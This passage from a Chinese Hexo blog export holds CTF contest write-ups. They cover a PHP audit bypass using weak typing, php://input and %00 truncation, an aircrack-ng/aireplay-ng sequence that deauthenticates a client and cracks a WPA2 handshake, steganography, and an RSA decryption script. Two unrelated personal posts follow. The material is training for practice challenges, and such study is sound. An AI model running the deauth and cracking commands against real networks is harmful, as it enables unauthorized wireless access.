class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hahahaha"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'23333'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"I want to join D0g3"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> strlen($b&lt;<span class="number">7</span>) <span class="keyword">and</span> eregi($b,<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一道代码审计题<br>梳理一下得到flag的条件：<br>第一个if出id不能等于0，若id等于0，那么!$_GET[‘id’]==1，就会进入if语句内部，然后会跳转但后面有要求id==0,当传入id等于一个英文字母时，由于php的弱类型，会将字母转化为0在进行比较，因此，我们可以使id=a来绕过</p>
<p>由后面a在file_get_contents中可以知道，a应该传入一个文件名，data读取a文件的内容后为”I want to join D0g3”,此处利用file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入，因此将a设为php://input,然后post我们想要输入a中的内容就可以了</p>
<p>使用eregi进行正则匹配时，只要第一个参数是第二个参数的子串就会匹配成功，返回true，在php中%00会对eregi()函数进行截断，但不会对strlen()函数进行截断，而且b的长度我做了限制只能为6位，因此，我们使用%00来构造截断绕过限制b=1%0012345，strlen不会ba%00算在字符长度里面   </p>
<p>Writeup：</p>
<p>这里看到源码，strlen可以通过%00来截断绕过，id==0 随便测试传个值，b需要绕过eregi 用00截 断 data通过使用伪协议绕过stripos</p>
<p>payload:</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1gyvyl5wj30pq0qqn1x.jpg" alt=""></p>
<h2 id="绝对找不到的D0g3-by-TimeS0ng"><a href="#绝对找不到的D0g3-by-TimeS0ng" class="headerlink" title="绝对找不到的D0g3 by TimeS0ng"></a>绝对找不到的D0g3 by TimeS0ng</h2><p>Wireshark抓包分析，ftp基于明文传输账号密码<br>payload:利用Wireshark过滤ftp数据包</p>
<p>By OldTang：</p>
<p>Wireshark打开查找D0g3</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1gzkgqshj30bk09e3zy.jpg" alt=""></p>
<h2 id="还能找到算我输-by-TimeS0ng"><a href="#还能找到算我输-by-TimeS0ng" class="headerlink" title="还能找到算我输   by TimeS0ng"></a>还能找到算我输   by TimeS0ng</h2><p>考察内容：aircrack-ng破解WPA2握手包密码，airdecap-ng还原802.11数据包<br>Tips1:数据包里有握手包  Tips2:flag以D0g3{IP_xxxx}形式提交我的内网IP</p>
<blockquote>
<p>aircrack-ng -w common.txt wpa2-01.cap<br>airdecap-ng D0g3-1.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8<br>airmon-ng start wlan0;iwconfig</p>
</blockquote>
<p>airodump-ng wlan0mon</p>
<p>airodump-ng wlan0mon -c 1 –essid TimeS0ng -w wpa2</p>
<p>aireplay-ng wlan0mon -0 3 -a E4:F3:F5:2D:55:A8  -c 98:01:a7:c5:f7:6d</p>
<p>aircrack-ng -w common.txt wpa2-01.cap</p>
<p>airdecap-ng wpa2-01.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8</p>
<h2 id="Amazing-magic-by-w1mps"><a href="#Amazing-magic-by-w1mps" class="headerlink" title="Amazing magic    by w1mps"></a>Amazing magic    by w1mps</h2><p>提示post个key，源码里提示post个source过来，然后给出了源码，审一下，ban了1到9，但是0可以用，利用0x绕过就可以了<br>payload: key=0xdec0de</p>
<p>Flag:D0g3{mmmmmagic!?!}</p>
<p>writeup：</p>
<p>post随便传个值后在页源码中发现一句提示</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h0fe9ofj30qa07sq4f.jpg" alt=""></p>
<p>接着post key=source</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1h0s0yw9j30oe09wn0v.jpg" alt=""></p>
<p>得到源码，源码要让number==14598366 但是字符并不能相同，所以这里想到通过转换进制 使用 两个进制进行比较  把14598366转换为16进制得到0xdec0de</p>
<p>所以key=0xdec0de</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1h0yf7wej30ns0hkgp4.jpg" alt=""></p>
<p>#####这道题难道是我在整理writeup的时候出的？我怎么一点印象都没有！！</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="热身upup"><a href="#热身upup" class="headerlink" title="热身upup"></a>热身upup</h2><h3 id="考察知识点-4"><a href="#考察知识点-4" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>摩斯电码，听得出来可以直接翻译，但是乐感较差的可以用音频编辑软件打开，例如AU，即可看到明显的分段</p>
<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p>D0g3{UUUTUTUUT}</p>
<h5 id="划重点：-1"><a href="#划重点：-1" class="headerlink" title="划重点："></a>划重点：</h5><p>一开始听到这个音频，简直懵逼，就各种试验，丢到au里，感觉不对劲，就各种百度google找到了摩斯电码这个神奇的东西。</p>
<h2 id="芬奇的日记"><a href="#芬奇的日记" class="headerlink" title="芬奇的日记"></a>芬奇的日记</h2><h3 id="链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h"><a href="#链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h" class="headerlink" title="链接: https://pan.baidu.com/s/1eSJAWWM 密码: ju3h"></a>链接: <a href="https://pan.baidu.com/s/1eSJAWWM" target="_blank" rel="noopener">https://pan.baidu.com/s/1eSJAWWM</a> 密码: ju3h</h3><h3 id="考察：图种，二维码反色，base64解密解法"><a href="#考察：图种，二维码反色，base64解密解法" class="headerlink" title="考察：图种，二维码反色，base64解密解法"></a>考察：图种，二维码反色，base64解密<strong>解法</strong></h3><p>丢在binwalk中跑，发现图中还有另一个图，分离出来，二维码反色，扫了之后得到字符串，base64解密</p>
<p>flag：<code>D0g3{Y0u _4re_c0Oi!}</code></p>
<p>writeup：</p>
<p>芬奇的日记 下载下来是一张png图片，先放到kali看看能不能分离</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h1h4eabj30n004gade.jpg" alt=""></p>
<p>发现有两张png图片，那么就dd分离 </p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h23dgouj30n202omzp.jpg" alt=""></p>
<p>得到了一张二维码的图片  </p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h2gn3qpj30ca0cgk0l.jpg" alt=""></p>
<p>用stegsolve打开调制Gray bits得到二维码</p>
<p>然后扫描得到下面的一串编码</p>
<p>Base64解一下得flag</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h42cuf5j30g20iidi0.jpg" alt=""></p>
<p>#####划重点：</p>
<p>论linux的重要性，在window下用winhex各种工具也看不出猫腻！</p>
<h2 id="来自佛的一封信-by-C1em0"><a href="#来自佛的一封信-by-C1em0" class="headerlink" title="来自佛的一封信  by C1em0"></a>来自佛的一封信  by C1em0</h2><ol>
<li>题目名：《来自佛的一封信》</li>
<li>考察内容：源码查看习惯，百度能力，base64编码</li>
<li>payload:在注释中找到密文，百度题目关键字就能在线解密。</li>
</ol>
<h5 id="划重点：-2"><a href="#划重点：-2" class="headerlink" title="划重点："></a>划重点：</h5><h2 id="留图不留种-by-zev3n"><a href="#留图不留种-by-zev3n" class="headerlink" title="留图不留种  by zev3n"></a>留图不留种  by zev3n</h2><h3 id="题目地址-2"><a href="#题目地址-2" class="headerlink" title="题目地址"></a>题目地址</h3><p><a href="http://pan.baidu.com/s/1pLNv33H" target="_blank" rel="noopener">http://pan.baidu.com/s/1pLNv33H</a></p>
<h3 id="题目类型-2"><a href="#题目类型-2" class="headerlink" title="题目类型"></a>题目类型</h3><p>zip伪加密，图种，二维码</p>
<h3 id="考察知识点-5"><a href="#考察知识点-5" class="headerlink" title="考察知识点"></a>考察知识点</h3><p>1.binwalk或winhex的使用<br>2.图种的解压<br>3.二维码两种定位点的作用<br>4.二维码的纠错功能</p>
<h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>1.winhex修改标记破解伪加密或者直接拿进Linux系统解压出图种<br>2.binwalk -e分解或者直接修改文件后缀名得到隐藏压缩包<br>3.得到两张不完整的二维码图片<br>4.观察二维码缺失定位点（以及辅助定位点），再观察图片中心有一个定位点样式区域<br>5.复制中心区域到三个角，再拼接上辅助定位点，扫描得到flag</p>
<h5 id="划重点"><a href="#划重点" class="headerlink" title="划重点:"></a>划重点:</h5><p>观察二维码缺失位点、辅助定位点</p>
<h2 id="RRRSA-by-w1mps"><a href="#RRRSA-by-w1mps" class="headerlink" title="RRRSA  by w1mps"></a>RRRSA  by w1mps</h2><p>rsa.txt<br>n的一个因数比较小，很容易跑出来p和q，求出d就解出来了，为了提示他们暴力跑。。另外一个因数其实也没给很大，不写脚本其实也可以出，比如可以去<a href="http://factordb.com/求解" target="_blank" rel="noopener">http://factordb.com/求解</a> </p>
<p>解密脚本：</p>
<h3 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding: utf-8"></a>coding: utf-8</h3><p>  c = [‘231209168460534368’,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos;653775369641132514&apos;,</span><br><span class="line">&apos;572992224772813854&apos;,</span><br><span class="line">&apos;24661130601438802&apos;,</span><br><span class="line">&apos;207970797586895508&apos;,</span><br><span class="line">&apos;7420374200071926&apos;,</span><br><span class="line">&apos;220033179808126041&apos;,</span><br><span class="line">&apos;690428728542718718&apos;,</span><br><span class="line">&apos;522803131162521381&apos;,</span><br><span class="line">&apos;108831082199640865&apos;,</span><br><span class="line">&apos;209002588024035867&apos;,</span><br><span class="line">&apos;690428728542718718&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;86875381817289627&apos;,</span><br><span class="line">&apos;576873037271561711&apos;,</span><br><span class="line">&apos;185467894761485820&apos;]</span><br></pre></td></tr></table></figure>
<p>  n = 696074725189933717<br>  e = 65537</p>
<h3 id="n很小，猜解其中一个因数很小"><a href="#n很小，猜解其中一个因数很小" class="headerlink" title="n很小，猜解其中一个因数很小"></a>n很小，猜解其中一个因数很小</h3><p>  def pq():</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for p in xrange(2, 100):</span><br><span class="line">    if (n % p == 0):</span><br><span class="line">        return p</span><br></pre></td></tr></table></figure>
<p>  def fast_mod(b, e, m):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = 1</span><br><span class="line">while e != 0:</span><br><span class="line">    if (e&amp;1) == 1:</span><br><span class="line">        # ei = 1, then mul</span><br><span class="line"></span><br><span class="line">        result = (result * b) % m</span><br><span class="line">    e &gt;&gt;= 1</span><br><span class="line">    # b, b^2, b^4, b^8, ... , b^(2^n)</span><br><span class="line">    b = (b*b) % m</span><br><span class="line">return result</span><br></pre></td></tr></table></figure>
<p>  def extendedGCD(a, b):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if b == 0:</span><br><span class="line">    return (1, 0, a)</span><br><span class="line">x1 = 1</span><br><span class="line">y1 = 0</span><br><span class="line">x2 = 0</span><br><span class="line">y2 = 1</span><br><span class="line">while b != 0:</span><br><span class="line">    q = a / b</span><br><span class="line">    r = a % b</span><br><span class="line">    a = b</span><br><span class="line">    b = r</span><br><span class="line">    x = x1 - q*x2</span><br><span class="line">    x1 = x2</span><br><span class="line">    x2 = x</span><br><span class="line">    y = y1 - q*y2</span><br><span class="line">    y1 = y2</span><br><span class="line">    y2 = y</span><br><span class="line">return(x1, y1, a)</span><br></pre></td></tr></table></figure>
<p>  def computeD(fn, e):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(x, y, r) = extendedGCD(fn, e)</span><br><span class="line">#y maybe &lt; 0, so convert it</span><br><span class="line">if y &lt; 0:</span><br><span class="line">    return fn + y</span><br><span class="line">return y</span><br></pre></td></tr></table></figure>
<p>  if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print &apos;n=&apos; + str(n)</span><br><span class="line">print &apos;e=&apos; + str(e)</span><br><span class="line">p = pq()</span><br><span class="line">q = n / pq()</span><br><span class="line">print &apos;p=&apos;+str(p)</span><br><span class="line">print &quot;q=&quot;+str(q)</span><br><span class="line">fn = (q-1)*(p-1)</span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print &apos;d=&apos; + str(d)</span><br><span class="line">for i in c:</span><br><span class="line">    c = int(i)</span><br><span class="line">    m1=fast_mod(c,d,n)</span><br><span class="line">    print &apos;解密:&apos;+str(m1)+&quot;     %s&quot; % ((&quot;%x&quot; % m1).decode(&quot;hex&quot;))</span><br></pre></td></tr></table></figure>
<p><img src="http://ovc0f0a85.bkt.clouddn.com/01j4epe30xxn79hqs0vujgbwhr.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/a211szfgpkyjsmc887nyxldgkq.png" alt=""></p>
<p>writeup：</p>
<p>首先还是要学习一下RSA算法是什么，下面贴一下学习的地方。 <a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3058.html</a> 在这里主要思路就是先通过n计算出p,q，通过p,q再计算出d，之后就可以求出m。 就在我上面贴的网址里面有可以求出p,q的值的网址。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fm1h4zjdm8j30qk0autd1.jpg" alt=""></p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fm1h5jcdqdj30ps0ton17.jpg" alt=""></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fm1h5uvt0ij30k00qsdhe.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fm1h67v3snj30na13gtjq.jpg" alt=""></p>
<p>这里就贴一部分了，最后解出来，就是这样。</p>
<h2 id="crypt-by-drac0nids"><a href="#crypt-by-drac0nids" class="headerlink" title="crypt  by drac0nids"></a>crypt  by drac0nids</h2><p>第一关给了一串二位数<br>二位数第一位代表手机键盘对应的位置<br>第二位数字代表第几个字母<br>得到密码为zhimakaimen<br>进入第二关<br>哈夫曼树<br>将叶子位置的节点先ascii转字符<br>然后按照哈夫曼编码排出先后顺序</p>
<h5 id="Question-6"><a href="#Question-6" class="headerlink" title="Question:"></a>Question:</h5><p>1.</p>
<p>2.</p>
<p>题目来源：dog3</p>
<p>没有注明的writeup均来自163faker。</p>
<p>谨做个人学习笔记之用，如有侵权请告知！</p>
</the>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Summary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[论Mac备份的重要性<-血的教训]]></title>
      <url>/2017/11/19/%E8%AE%BAMac%E5%A4%87%E4%BB%BD%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7%3C-%E8%A1%80%E7%9A%84%E6%95%99%E8%AE%AD/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>总以为不会发生的事情，万一有一天真的降临在你头上了……<a id="more"></a></excerpt></p>
<p><the rest="" of="" contents="" |="" 余下全文=""></the></p>
<h3 id="博客转移"><a href="#博客转移" class="headerlink" title="博客转移"></a>博客转移</h3><p>​    由于blog文件没有备份，所以所有文章都不见了，也懒得再找回来了，虽然也没几篇！原<a href="http://www.cnblogs.com/AK-K/" target="_blank" rel="noopener">博客</a></p>
<p>​    有时间就更新Blog，写下自己的学习和生活路上的点点滴滴！！</p>
<h3 id="论备份的重要性"><a href="#论备份的重要性" class="headerlink" title="论备份的重要性"></a>论备份的重要性</h3><p>​    前天mac提示系统更新，由于一直没有养成打补丁前要备份的好习惯，所以就直接开始了系统更新！！但是，奇迹的事情发生了，进度条卡在半路3小时！！我就强制重启了！！然后出现了令人发指的场面！！<img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fln7wf8vz5j30xk0iihdt.jpg" alt=""></p>
<p>​    输入密码之后，就出现system崩溃的场景！！</p>
<p>​    很绝望啊，有木有！！然后就用mac实用工具修复了半天！！wifi网络不稳定，让我一直反反复复的装系统，还是没有成功！<img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fln7xxuc94j30oa0j67r8.jpg" alt="">    然后各种google百度，找解决方案，还找apple支持的客服。既然网络修复不行，那就做u盘启动盘嘛！但是！！！我并不是土豪，就只有一台mac。。<img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fln7zm6ovaj31kw0gp7wi.jpg" alt="">win下做的启动盘，人家mac根本不理你！！我。。。。。真的好绝望！！然后就下定决心，网络修复了！！最后还是回到了<img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fln818frm3j30fs04e3yt.jpg" alt="">的怀抱！！</p>
<p>​    历时3天的血的教训！！</p>
<p>​    不晓得重新装各种环境，还要多少时间！！</p>
<p>我只想说：</p>
<p>​    1.无论如何,请一定记得Timemachine是个好东西！！</p>
<p>​    2.一定要准备一个mac的u盘启动盘（预防万一）</p>
]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 心路历程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/11/19/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
